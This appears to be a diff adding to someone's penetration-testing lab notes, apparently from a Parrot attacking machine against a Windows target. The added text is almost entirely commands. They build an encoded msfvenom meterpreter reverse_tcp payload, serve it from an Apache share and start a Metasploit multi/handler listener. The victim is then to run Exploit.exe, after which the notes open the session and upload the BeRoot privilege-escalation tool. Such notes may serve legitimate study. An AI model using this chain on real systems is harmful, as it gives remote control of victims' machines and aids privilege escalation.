@@ -1409,6 +1409,46 @@ cp /home/attacker/desktop/Filename.ext /var/www/html/share
 service apache2start
 
 http://ParrotmachineIP/share
+
+To get files from Windows:
+smb://WindowsIP
+
+To begin reverse shell:
+
+cd 
+
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86/shikata_ga_nai -b "\x00" LHOST=ParrotIP -f exe > /home/attacker/Desktop/Exploit.exe
+
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+ls -la /var/www/html/ |grep share
+
+cp /home/attacker/Desktop/Exploit.exe /var/www/html/share
+
+service apache2 start
+
+msfconsole
+
+use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+set LHOST ParrotIP
+
+exploit -j -z
+
+Switch to Windows and Download from http://ParrotIP/share
+
+Once file Exploit.exe is run on machine, switch to Parrot
+
+sessions -i 1
+getuid
+
+upload /home/attacker/Desktop/BeRoot/beRoot.exe
+
+
+
+
 ____________________________________________________________________________________________________________
 Resources: 
 
